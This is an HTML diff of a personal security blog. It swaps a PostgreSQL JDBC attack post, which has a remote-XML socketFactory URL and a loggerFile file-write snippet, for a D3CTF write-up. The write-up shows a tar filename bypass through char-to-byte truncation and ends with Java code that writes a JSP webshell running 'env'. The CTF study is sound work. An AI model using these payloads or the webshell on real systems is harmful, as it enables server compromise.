@@ -9,7 +9,7 @@
     
     <title>
         
-            postgreSQL |
+            D3CTF-d3jtar |
         
         1diot9&#39;s Blog
     </title>
@@ -238,7 +238,7 @@
             <div class="post-content-bottom border-box">
                 
                     <div class="post-title">
-                        postgreSQL
+                        D3CTF-d3jtar
                     </div>
                 
 
@@ -266,13 +266,13 @@
         
             <span class="meta-info-item post-create-date">
                 <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
-                <span class="datetime">2025-05-05 20:09:32</span>
+                <span class="datetime">2025-06-01 20:19:58</span>
             </span>
 
             
                 <span class="meta-info-item post-update-date">
                     <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                    <span class="datetime" data-updated="Mon May 05 2025 20:09:55 GMT+0800">2025-05-05 20:09:55</span>
+                    <span class="datetime" data-updated="Tue Jun 03 2025 15:14:17 GMT+0800">2025-06-03 15:14:17</span>
                 </span>
             
         
@@ -281,7 +281,7 @@
             <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
                 <ul class="post-category-ul">
                     
-                            <li class="category-item"><a href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a></li>
+                            <li class="category-item"><a href="/categories/CTF-Java/">CTF-Java</a></li>
                         
                     
                 </ul>
@@ -292,7 +292,7 @@
             <span class="post-tag meta-info-item border-box">
                 <ul class="post-tag-ul">
                     
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a></li>
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/CTF-Java/">CTF-Java</a></li>
                         
                     
                 </ul>
@@ -302,12 +302,12 @@
         
         
             <span class="meta-info-item post-wordcount">
-                <i class="icon fas fa-file-word"></i>&nbsp;<span>108 字</span>
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>686 字</span>
             </span>
         
         
             <span class="meta-info-item post-min2read">
-                <i class="icon fas fa-clock"></i>&nbsp;<span>1 分钟</span>
+                <i class="icon fas fa-clock"></i>&nbsp;<span>3 分钟</span>
             </span>
         
         
@@ -329,11 +329,37 @@
                     
 
                     
-                         <h1 id="构造方法调用"><a href="#构造方法调用" class="headerlink" title="构造方法调用"></a>构造方法调用</h1><p>DriverManager.getConnection(“jdbc:postgresql:&#x2F;&#x2F;node1&#x2F;test?socketFactory&#x3D;org.springframework.context.support.ClassPathXmlApplicationContext&amp;socketFactoryArg&#x3D;<a class="link"   target="_blank" rel="noopener" href="http://target/exp.xml" >http://target/exp.xml<i class="fas fa-external-link-alt"></i></a>“);</p>
-<h1 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cve202221724</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">loggerLevel</span> <span class="operator">=</span> <span class="string">&quot;debug&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">loggerFile</span> <span class="operator">=</span> <span class="string">&quot;test.txt&quot;</span>;</span><br><span class="line">        String shellContent=<span class="string">&quot;test&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jdbcUrl</span> <span class="operator">=</span> <span class="string">&quot;jdbc:postgresql://127.0.0.1:5432/test?loggerLevel=&quot;</span>+loggerLevel+<span class="string">&quot;&amp;loggerFile=&quot;</span>+loggerFile+ <span class="string">&quot;&amp;&quot;</span>+shellContent;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(jdbcUrl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+                         <p>比赛的时候没做出来，现在来复现一下。</p>
+<p>在TarHeader类中有两个方法，负责对文件名进行解析。</p>
+<p>这个是压缩时的方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public static int getNameBytes(StringBuffer name, byte[] buf, int offset, int length) &#123;</span><br><span class="line">	int i;</span><br><span class="line"></span><br><span class="line">	for (i = 0; i &lt; length &amp;&amp; i &lt; name.length(); ++i) &#123;</span><br><span class="line">		buf[offset + i] = (byte) name.charAt(i);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	for (; i &lt; length; ++i) &#123;</span><br><span class="line">		buf[offset + i] = 0;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	return offset + length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>不过这样写保存的文件前后会有脏字符。</p>
 
+
+<p>这个是解压时的方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public static StringBuffer parseName(byte[] header, int offset, int length) &#123;</span><br><span class="line">    StringBuffer result = new StringBuffer(length);</span><br><span class="line"></span><br><span class="line">    int end = offset + length;</span><br><span class="line">    for (int i = offset; i &lt; end; ++i) &#123;</span><br><span class="line">       if (header[i] == 0)</span><br><span class="line">          break;</span><br><span class="line">       result.append((char) header[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里重点关注一下压缩时的方法。可以看到，这里对文件名name，进行了 (byte) name.charAt(i) 操作。name.charAt()得到是char类型数据，占16位，默认实现UTF-16，是Unicode码点序列。而byte类型只占8位。这就导致name中的中文在转化成byte类型时，会丢失高位部分。因此，现在要做的就是找到一个Unicode字符，其丢失高位后与jsp中的任意一个字符相同。</p>
+<p>这里以 j 为例。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> solution;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">name</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        name.append(<span class="string">&quot;你abc123&quot;</span>);</span><br><span class="line">        <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> name.charAt(<span class="number">0</span>);</span><br><span class="line">        System.out.println(c);</span><br><span class="line">        System.out.println((<span class="type">byte</span>) c);</span><br><span class="line">        System.out.println((<span class="type">byte</span>) <span class="string">&#x27;j&#x27;</span>);</span><br><span class="line">        unicodeSearch();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unicodeSearch</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">codePoint</span> <span class="operator">=</span> Character.MIN_CODE_POINT; codePoint &lt;= Character.MAX_CODE_POINT; codePoint++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!Character.isDigit(codePoint)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(Character.toChars(codePoint));</span><br><span class="line">            <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> s.charAt(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">byte</span>) c == <span class="number">106</span>)&#123;</span><br><span class="line">                System.out.println(String.format(<span class="string">&quot;%c: U+%04X%n&quot;</span>, c, codePoint));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>python脚本也行：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">unicode_high_lost</span>(<span class="params">c</span>):</span><br><span class="line">    unicode_format = c.encode(<span class="string">&quot;unicode-escape&quot;</span>).decode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">    hex_str = unicode_format[-<span class="number">2</span>:]</span><br><span class="line">    char = <span class="built_in">chr</span>(<span class="built_in">int</span>(hex_str, <span class="number">16</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c&#125;</span>--&gt;<span class="subst">&#123;char&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x0000</span>, <span class="number">0xFFFF</span>+<span class="number">1</span>):</span><br><span class="line">        hex_str = <span class="built_in">format</span>(i, <span class="string">&quot;04x&quot;</span>)</span><br><span class="line">        last2 = hex_str[-<span class="number">2</span>:]</span><br><span class="line">        char_old = <span class="built_in">chr</span>(<span class="built_in">int</span>(hex_str, <span class="number">16</span>))</span><br><span class="line">        char_new = <span class="built_in">chr</span>(<span class="built_in">int</span>(last2, <span class="number">16</span>))</span><br><span class="line">        <span class="keyword">if</span> char_new == <span class="string">&#x27;j&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;char_old&#125;</span>丢失高位后变成：<span class="subst">&#123;char_new&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>找到一些能用的字符</p>
+<p>Ū(\u016a)丢失高位后变成：j</p>
+<p>ɪ(\u026a)丢失高位后变成：j</p>
+<p>ͪ(\u036a)丢失高位后变成：j</p>
+<p>Ѫ(\u046a)丢失高位后变成：j</p>
+<p>ժ(\u056a)丢失高位后变成：j</p>
+<p>٪(\u066a)丢失高位后变成：j</p>
+<p>ݪ(\u076a)丢失高位后变成：j</p>
+<p>ࡪ(\u086a)丢失高位后变成：j</p>
+<p>४(\u096a)丢失高位后变成：j</p>
+<p>创建jsp马即可：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> solution;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WriteJsp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;shell.\u096Asp&quot;</span>);</span><br><span class="line">        fos.write((<span class="string">&quot;&lt;%@ page import=\&quot;java.io.InputStream\&quot; %&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;%@ page import=\&quot;java.util.Scanner\&quot; %&gt;&lt;%\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    Process env = Runtime.getRuntime().exec(\&quot;env\&quot;);\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    InputStream inputStream = env.getInputStream();\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    Scanner scanner = new Scanner(inputStream).useDelimiter(\&quot;\\\\A\&quot;);\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    String s = scanner.hasNext() ? scanner.next() : \&quot;\&quot;;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    out.print(s);\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;%&gt;&quot;</span>).getBytes());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
                     
                 </div>
 
@@ -343,11 +369,11 @@
     <div class="copyright-info-content border-box">
         <div class="copyright-info-top border-box">
             <div class="copyright-post-title border-box text-ellipsis">
-                postgreSQL
+                D3CTF-d3jtar
             </div>
 
             <div class="copyright-post-link border-box text-ellipsis">
-                2025/05/05/postgreSQL/
+                2025/06/01/D3CTF-d3jtar/
             </div>
         </div>
 
@@ -363,7 +389,7 @@
                 <div class="type">
                     发布于
                 </div>
-                <div class="content">2025-05-05 20:09</div>
+                <div class="content">2025-06-01 20:19</div>
             </div>
 
 
@@ -399,7 +425,7 @@
                             <ul class="post-tags-box border-box">
                                 
                                     <li class="tag-item border-box">
-                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a>
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/CTF-Java/">CTF-Java</a>
                                     </li>
                                 
                             </ul>
@@ -415,31 +441,15 @@
                 
                     <div class="post-nav border-box">
                         
-                            <div class="prev-post">
-                                <a class="prev"
-                                   rel="prev"
-                                   href="/2025/05/05/h2sql/"
-                                   title="h2sql"
-                                >
-                                    <span class="left arrow-icon flex-center">
-                                        <i class="fas fa-chevron-left"></i>
-                                    </span>
-                                    <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">h2sql</span>
-                                        <span class="post-nav-item">上一篇</span>
-                                    </span>
-                                </a>
-                            </div>
-                        
                         
                             <div class="next-post">
                                 <a class="next"
                                    rel="next"
-                                   href="/2025/05/05/hsql/"
-                                   title="hsql"
+                                   href="/2025/05/22/%E4%BA%AC%E9%BA%92CTF25-%E7%83%AD%E8%BA%ABWeb/"
+                                   title="京麒CTF25-热身Web"
                                 >
                                     <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">hsql</span>
+                                        <span class="post-nav-title-item text-ellipsis">京麒CTF25-热身Web</span>
                                         <span class="post-nav-item">下一篇</span>
                                     </span>
                                     <span class="right arrow-icon flex-center">
@@ -467,7 +477,7 @@
             <div class="pc-post-toc right-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8"><span class="nav-number">1.</span> <span class="nav-text">构造方法调用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%99%E6%96%87%E4%BB%B6"><span class="nav-number">2.</span> <span class="nav-text">写文件</span></a></li></ol>
+        
     </div>
 </div>
 
@@ -657,7 +667,7 @@
             <div class="tablet-post-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8"><span class="nav-number">1.</span> <span class="nav-text">构造方法调用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%99%E6%96%87%E4%BB%B6"><span class="nav-number">2.</span> <span class="nav-text">写文件</span></a></li></ol>
+        
     </div>
 </div>
 
